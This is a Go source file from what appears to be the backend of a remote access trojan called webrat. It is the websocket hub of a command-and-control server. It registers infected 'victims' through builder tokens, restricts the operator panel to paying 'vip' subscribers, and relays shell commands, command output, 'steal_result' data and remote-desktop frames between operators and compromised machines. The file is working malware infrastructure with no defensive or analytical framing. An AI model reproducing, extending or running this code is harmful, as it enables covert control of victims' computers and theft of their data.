package ws

import (
	"encoding/json"
	"log"
	"net/http"
	"strings"
	"sync"
	"time"

	"webrat-go-api/internal/storage"

	"github.com/gorilla/websocket"
)

type Hub struct {
	db *storage.DB

	mu                 sync.RWMutex
	victims            map[string]*storage.Victim
	clients            map[*websocket.Conn]bool
	clientOwners       map[*websocket.Conn]string
	victimSockets      map[string]*websocket.Conn
	victimOwnersByConn map[*websocket.Conn]string
	bannedVictimIDs    map[string]bool
	hiddenVictimIDs    map[string]map[string]bool

	connMu    sync.Mutex
	connWrite map[*websocket.Conn]*sync.Mutex

	lim limiter

	upgrader websocket.Upgrader
}

func NewHub(db *storage.DB) (*Hub, error) {
	h := &Hub{
		db:                 db,
		victims:            make(map[string]*storage.Victim),
		clients:            make(map[*websocket.Conn]bool),
		clientOwners:       make(map[*websocket.Conn]string),
		victimSockets:      make(map[string]*websocket.Conn),
		victimOwnersByConn: make(map[*websocket.Conn]string),
		bannedVictimIDs:    make(map[string]bool),
		hiddenVictimIDs:    make(map[string]map[string]bool),
		connWrite:          make(map[*websocket.Conn]*sync.Mutex),
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return isAllowedOrigin(r) },
		},
	}

	if db != nil {
		victims, err := db.LoadVictimsFromDB()
		if err != nil {
			return nil, err
		}
		h.mu.Lock()
		for _, v := range victims {
			if v == nil {
				continue
			}
			id := strings.TrimSpace(v.ID)
			if id == "" {
				continue
			}
			vv := *v
			h.victims[id] = &vv
		}
		h.mu.Unlock()

		hidden, err := db.LoadHiddenVictims()
		if err != nil {
			return nil, err
		}
		banned, err := db.LoadBannedVictimIDs()
		if err != nil {
			return nil, err
		}

		h.mu.Lock()
		h.hiddenVictimIDs = hidden
		for _, id := range banned {
			id = strings.TrimSpace(id)
			if id != "" {
				h.bannedVictimIDs[id] = true
			}
		}
		h.mu.Unlock()
	}

	h.startCleanup()
	return h, nil
}

func (h *Hub) HandleHTTP(w http.ResponseWriter, r *http.Request) {
	ip := getClientIP(r)
	log.Printf("[ws] new connection ip=%s ua=%s", ip, r.UserAgent())
	ok := h.lim.allowUpgrade(ip)
	if !ok {
		log.Printf("[ws] rate limited ip=%s", ip)
		w.WriteHeader(http.StatusTooManyRequests)
		return
	}
	defer h.lim.release(ip)

	panelLogin := ""
	if h.db != nil {
		panelLogin = getPanelLogin(h.db, r)
	}

	ownerLogin := ""
	token := strings.TrimSpace(r.Header.Get("X-Builder-Token"))
	log.Printf("[ws] token=%q panelLogin=%q ip=%s", token, panelLogin, ip)
	if token != "" && h.db != nil {
		if login, ok, err := h.db.GetLoginByBuilderToken(token); err == nil && ok {
			ownerLogin = strings.ToLower(strings.TrimSpace(login))
			log.Printf("[ws] token resolved owner=%s ip=%s", ownerLogin, ip)
		} else {
			log.Printf("[ws] token lookup failed ok=%v err=%v ip=%s", ok, err, ip)
		}
	}

	if panelLogin != "" && !isAllowedOrigin(r) {
		w.WriteHeader(http.StatusForbidden)
		return
	}
	if panelLogin != "" && h.db != nil {
		status, _, _, err := h.db.GetSubscription(panelLogin)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		if status != "vip" {
			w.WriteHeader(http.StatusForbidden)
			return
		}
	}
	if ownerLogin != "" && h.db != nil {
		_, _, _, _ = h.db.GetSubscription(ownerLogin)
	}

	ws, err := h.upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer ws.Close()

	stopPing := make(chan struct{})
	defer close(stopPing)

	ws.SetReadLimit(4 * 1024 * 1024)
	_ = ws.SetReadDeadline(time.Now().Add(5 * time.Minute))
	ws.SetPongHandler(func(string) error {
		_ = ws.SetReadDeadline(time.Now().Add(5 * time.Minute))
		return nil
	})

	associatedVictimID := ""

	go h.pingLoop(ws, panelLogin, stopPing)

	if panelLogin != "" {
		h.mu.Lock()
		h.clients[ws] = true
		h.clientOwners[ws] = panelLogin
		h.mu.Unlock()
		h.broadcastVictims()
	}

	for {
		_, message, err := ws.ReadMessage()
		if err != nil {
			break
		}
		_ = ws.SetReadDeadline(time.Now().Add(5 * time.Minute))

		if !h.lim.allowMessage(ip) {
			m := h.getConnMutex(ws)
			m.Lock()
			_ = ws.SetWriteDeadline(time.Now().Add(2 * time.Second))
			_ = ws.WriteControl(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.ClosePolicyViolation, "rate limit"), time.Now().Add(2*time.Second))
			m.Unlock()
			break
		}

		var payload map[string]any
		if err := json.Unmarshal(message, &payload); err != nil {
			continue
		}

		switch strFrom(payload["type"]) {
		case "register":
			if id := h.handleRegister(ws, payload, ownerLogin, token, ip); id != "" {
				associatedVictimID = id
				ownerLogin = strings.ToLower(strings.TrimSpace(strFrom(payload["owner"])))
				if ownerLogin == "" {
					ownerLogin = strings.ToLower(strings.TrimSpace(ownerLogin))
				}
			}
		case "update":
			h.handleUpdate(payload)
		case "ping":
			h.handlePing(ws, associatedVictimID)
		case "command", "rd_start", "rd_stop":
			h.handleCommand(ws, payload, panelLogin)
		case "cmd_output":
			h.handleCmdOutput(ws, payload)
		case "steal_result":
			h.handleStealResult(ws, payload)
		case "rd_frame":
			h.handleRDFrame(ws, payload, associatedVictimID)
		}
	}

	h.disconnectConn(ws)
}

func (h *Hub) pingLoop(ws *websocket.Conn, panelLogin string, stop <-chan struct{}) {
	t := time.NewTicker(25 * time.Second)
	defer t.Stop()
	for {
		select {
		case <-stop:
			return
		case <-t.C:
			if panelLogin != "" && h.db != nil {
				status, _, _, err := h.db.GetSubscription(panelLogin)
				if err != nil || status != "vip" {
					_ = ws.Close()
					return
				}
			}
			m := h.getConnMutex(ws)
			m.Lock()
			_ = ws.SetWriteDeadline(time.Now().Add(15 * time.Second))
			err := ws.WriteControl(websocket.PingMessage, []byte("ping"), time.Now().Add(15*time.Second))
			m.Unlock()
			if err != nil {
				_ = ws.Close()
				return
			}
		}
	}
}

func (h *Hub) disconnectConn(ws *websocket.Conn) {
	h.mu.Lock()
	delete(h.clients, ws)
	delete(h.clientOwners, ws)
	delete(h.victimOwnersByConn, ws)

	var toOffline []*storage.Victim
	for id, c := range h.victimSockets {
		if c == ws {
			if v, ok := h.victims[id]; ok {
				v.Online = false
				v.LastActive = time.Now()
				vv := *v
				toOffline = append(toOffline, &vv)
			}
			delete(h.victimSockets, id)
		}
	}
	h.mu.Unlock()

	h.removeConn(ws)

	for _, v := range toOffline {
		if h.db != nil {
			_ = h.db.UpsertVictim(v)
		}
	}
	if len(toOffline) > 0 {
		h.broadcastVictims()
	}
}